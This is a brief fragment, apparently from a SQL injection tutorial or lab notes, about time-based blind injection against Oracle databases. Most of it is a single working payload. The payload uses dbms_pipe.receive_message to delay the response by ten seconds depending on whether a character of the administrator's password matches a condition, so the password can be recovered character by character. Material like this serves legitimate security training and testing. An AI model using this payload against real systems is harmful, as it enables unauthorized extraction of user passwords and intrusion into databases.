
---
SQL query is executed synchronously, it is possible to trigger conditional time delays to infer information.

Try Oracle syntax :

```
' || SELECT CASE WHEN ((select count(username) from users where username = 'administrator' and substr(password,1,1) > 'm') = 1) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual-- 
```

